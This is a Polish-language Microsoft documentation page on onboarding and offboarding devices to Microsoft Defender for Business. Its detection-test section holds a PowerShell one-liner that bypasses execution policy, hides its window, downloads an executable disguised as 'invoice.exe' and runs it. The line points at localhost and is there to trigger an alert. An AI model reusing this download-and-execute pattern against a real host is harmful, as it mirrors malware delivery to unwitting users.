---
title: Dołączanie urządzeń organizacji do Microsoft Defender dla Firm
description: Dołączanie urządzeń organizacji do Microsoft Defender dla Firm
search.appverid: MET150
author: denisebmsft
ms.author: deniseb
manager: dansimp
audience: Admin
ms.topic: how-to
ms.service: o365-administration
ms.localizationpriority: high
ms.reviewer: shlomiakirav
f1.keywords: NOCSH
ms.collection:
- SMB
- M365-security-compliance
ms.openlocfilehash: 70be4a5b7991d038dd1e34c00778de6bb3a67b84
ms.sourcegitcommit: 85799f0efc06037c1ff309fe8e609bbd491f9b68
ms.translationtype: MT
ms.contentlocale: pl-PL
ms.lasthandoff: 07/01/2022
ms.locfileid: "66573974"
---
# <a name="onboard-enrolled-devices-to-microsoft-defender-for-business"></a>Dołączanie zarejestrowanych urządzeń do Microsoft Defender dla Firm

Microsoft 365 Business Premium obejmuje Microsoft Defender dla Firm, rozwiązanie zabezpieczeń punktu końcowego dla małych i średnich firm. Usługa Defender dla firm zapewnia ochronę nowej generacji (oprogramowanie antywirusowe, oprogramowanie chroniące przed złośliwym kodem i ochronę dostarczaną przez chmurę), ochronę zapory, filtrowanie zawartości internetowej i inne funkcje dla urządzeń firmy. Ochrona jest stosowana podczas dołączania urządzeń. 

Aby dołączyć urządzenia, możesz wybrać jedną z kilku opcji:

- [Automatyczne dołączanie urządzeń z systemem Windows zarejestrowanych w Microsoft Intune](#use-automatic-onboarding-for-windows-devices-that-are-already-enrolled-in-intune)
- [Lokalny skrypt dołączania urządzeń z systemem Windows i macOS do usługi Defender dla Firm](#use-a-local-script-to-onboard-windows-and-macos-devices-to-defender-for-business)
- [Intune do rejestrowania urządzeń, w tym urządzeń przenośnych](#use-intune-to-enroll-devices) (Windows, macOS, iOS i Android), a następnie stosowania zasad usługi Defender for Business do tych urządzeń

Ten artykuł zawiera również następujące elementy:

- [Jak uruchomić test wykrywania na urządzeniu z systemem Windows](#run-a-detection-test-on-a-windows-device)
- [Jak stopniowo dołączać urządzenia](#onboard-devices-gradually)
- [Jak odłączyć urządzenie](#offboard-a-device) , jeśli urządzenie zostanie zastąpione lub ktoś opuści organizację

> [!IMPORTANT]
> Jeśli coś pójdzie nie tak i proces dołączania zakończy się niepowodzeniem, zobacz [Microsoft Defender dla Firm rozwiązywanie problemów](../security/defender-business/mdb-troubleshooting.yml).

## <a name="use-automatic-onboarding-for-windows-devices-that-are-already-enrolled-in-intune"></a>Używanie automatycznego dołączania dla urządzeń z systemem Windows, które są już zarejestrowane w Intune

Urządzenia z systemem Windows można automatycznie dołączyć do usługi Defender dla Firm, jeśli te urządzenia są już zarejestrowane w Intune. Usługa Defender dla firm wykrywa urządzenia klienckie z systemem Windows zarejestrowane w Intune i monituje o wybranie, czy te urządzenia mają zostać automatycznie dołączone. Zasady zabezpieczeń i ustawienia w usłudze Defender dla Firm są następnie stosowane do tych urządzeń. Nazywamy ten proces *automatycznym dołączaniem*. Należy pamiętać, że opcja automatycznego dołączania dotyczy tylko urządzeń z systemem Windows. Automatyczne dołączanie jest dostępne, jeśli spełnione są następujące warunki:

- Twoja organizacja korzystała już z usługi Microsoft Endpoint Manager, Microsoft Intune lub Mobile Zarządzanie urządzeniami (MDM) w Intune, zanim otrzymasz usługę Defender for Business (Microsoft 365 Business Premium klienci mają już Microsoft Intune).
- Masz już urządzenia z systemem Windows zarejestrowane w Intune.

> [!TIP]
> Po wyświetleniu monitu o użycie automatycznego dołączania zalecamy wybranie opcji "wszystkie zarejestrowane urządzenia". Dzięki temu, gdy urządzenia z systemem Windows zostaną zarejestrowane w Intune później, zostaną automatycznie dołączone do usługi Defender dla Firm.

Aby dowiedzieć się więcej na temat automatycznego dołączania, zobacz [Konfigurowanie Microsoft Defender dla Firm za pomocą kreatora](../security/defender-business/mdb-use-wizard.md).

## <a name="use-a-local-script-to-onboard-windows-and-macos-devices-to-defender-for-business"></a>Dołączanie urządzeń z systemem Windows i macOS do usługi Defender dla firm przy użyciu skryptu lokalnego

Do dołączania urządzeń z systemami Windows i Mac można użyć skryptu lokalnego. Po uruchomieniu skryptu dołączania na urządzeniu tworzy on relację zaufania z usługą Azure Active Directory (jeśli to zaufanie jeszcze nie istnieje), rejestruje urządzenie w Intune (jeśli nie zostało jeszcze zarejestrowane), a następnie dołącza urządzenie do usługi Defender dla Firm. Możesz dołączać maksymalnie 10 urządzeń jednocześnie przy użyciu skryptu lokalnego.

1. Przejdź do portalu Microsoft 365 Defender ([https://security.microsoft.com](https://security.microsoft.com)) i zaloguj się.

2. W okienku nawigacji wybierz pozycję **Ustawienia** > **Punkty końcowe**, a następnie w obszarze **Zarządzanie urządzeniami** wybierz pozycję **Dołączanie**.

3. Wybierz system operacyjny, taki jak **Windows 10 i 11** lub **macOS**, a następnie w sekcji **Metoda wdrażania** wybierz pozycję **Skrypt lokalny**. 

4. Wybierz pozycję **Pobierz pakiet dołączania**. Zalecamy zapisanie pakietu dołączania na dysku wymiennym. (Jeśli wybrano system **macOS**, wybierz również pozycję **Pobierz pakiet instalacyjny** i zapisz go na urządzeniu wymiennym).

5. Skorzystaj z następujących wskazówek:

   - Urządzenia z systemem Windows: [dołączanie urządzeń z systemem Windows przy użyciu skryptu lokalnego](../security/defender-endpoint/configure-endpoints-script.md#onboard-windows-devices-using-a-local-script)
   - Urządzenia z systemem macOS: [ręczne wdrażanie Ochrona punktu końcowego w usłudze Microsoft Defender w systemie macOS](../security/defender-endpoint/mac-install-manually.md#download-installation-and-onboarding-packages)

## <a name="use-intune-to-enroll-devices"></a>Rejestrowanie urządzeń przy użyciu Intune

Aby zarejestrować urządzenie, zarejestruj je samodzielnie lub poproś użytkowników o zalogowanie się do portalu firmy i zarejestrowanie i zainstalowanie wszystkich potrzebnych aplikacji. 

Jeśli korzystasz już z usługi Intune lub mobile Zarządzanie urządzeniami, zanim uzyskasz usługę Defender dla Firm, możesz nadal używać Intune do dołączania urządzeń organizacji. Za pomocą Intune można dołączać komputery, tablety i telefony, w tym urządzenia z systemami iOS i Android.

Zobacz [Rejestrowanie urządzeń w Microsoft Intune](/mem/intune/enrollment/device-enrollment). 

## <a name="run-a-detection-test-on-a-windows-device"></a>Uruchamianie testu wykrywania na urządzeniu z systemem Windows

Po dodaniu urządzeń z systemem Windows do usługi Defender dla Firm możesz uruchomić test wykrywania na urządzeniu z systemem Windows, aby upewnić się, że wszystko działa poprawnie.

1. Na urządzeniu z systemem Windows utwórz folder: `C:\test-MDATP-test`.

2. Otwórz wiersz polecenia jako administrator.

3. W oknie wiersza polecenia uruchom następujące polecenie programu PowerShell:

   ```powershell
   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
   ```

Po uruchomieniu polecenia okno wiersza polecenia zostanie zamknięte automatycznie. Jeśli test wykrywania zakończy się pomyślnie, w portalu Microsoft 365 Defender ([https://security.microsoft.com](https://security.microsoft.com)) dla nowo dołączonego urządzenia zostanie wyświetlony nowy alert w ciągu około dziesięciu minut.

## <a name="onboard-devices-gradually"></a>Stopniowo dołączanie urządzeń

Jeśli wolisz dołączać urządzenia w fazach, które nazywamy *stopniowym dołączaniem urządzeń*, wykonaj następujące kroki: 

1. Zidentyfikuj zestaw urządzeń do dołączenia.

2. Przejdź do portalu Microsoft 365 Defender ([https://security.microsoft.com](https://security.microsoft.com)) i zaloguj się.

3. W okienku nawigacji wybierz pozycję **Ustawienia** > **Punkty końcowe**, a następnie w obszarze **Zarządzanie urządzeniami** wybierz pozycję **Dołączanie**.

4. Wybierz system operacyjny (na przykład **Windows 10 i 11),** a następnie wybierz metodę dołączania (na przykład **skrypt lokalny**). Postępuj zgodnie ze wskazówkami podanymi dla wybranej metody.

5. Powtórz ten proces dla każdego zestawu urządzeń, które chcesz dołączyć. 

> [!TIP]
> Nie trzeba używać tego samego pakietu dołączania za każdym razem, gdy dołączasz urządzenia. Na przykład możesz użyć skryptu lokalnego do dołączania niektórych urządzeń, a później możesz wybrać inną metodę dołączania większej liczby urządzeń.

## <a name="offboard-a-device"></a>Odłączanie urządzenia

Jeśli chcesz odłączyć urządzenie, użyj jednej z następujących procedur:

1. W okienku nawigacji wybierz pozycję **Ustawienia**, a następnie wybierz pozycję **Punkty końcowe**.

2. W obszarze **Zarządzanie urządzeniami** wybierz pozycję **Odłączanie**.

3. Wybierz system operacyjny, taki jak **Windows 10 i 11**, a następnie w obszarze **Odłącz urządzenie** w sekcji **Metoda wdrażania** wybierz pozycję **Skrypt lokalny**. 

4. Na ekranie potwierdzenia przejrzyj informacje, a następnie wybierz pozycję **Pobierz** , aby kontynuować.

5. Wybierz pozycję **Pobierz pakiet odłączania**. Zalecamy zapisanie pakietu odłączania na dysku wymiennym.

6. Uruchom skrypt na każdym urządzeniu, które chcesz odłączyć. Potrzebujesz pomocy dotyczącej tego zadania? Zobacz następujące zasoby:   

   - Urządzenia z systemem Windows: [odłączanie urządzeń z systemem Windows przy użyciu skryptu lokalnego](../security/defender-endpoint/configure-endpoints-script.md#offboard-devices-using-a-local-script) 
   - Urządzenia z systemem macOS: [odinstalowywanie w systemie macOS](../security/defender-endpoint/mac-resources.md#uninstalling)

> [!IMPORTANT]
> Odłączenie urządzenia powoduje, że urządzenia przestają wysyłać dane do usługi Defender dla Firm. Jednak dane odebrane przed odłożeniem są przechowywane przez maksymalnie sześć (6) miesięcy.

## <a name="next-objective"></a>Następny cel

[Skonfiguruj ochronę urządzeń z systemem Windows](m365bp-protection-settings-for-windows-10-devices.md).
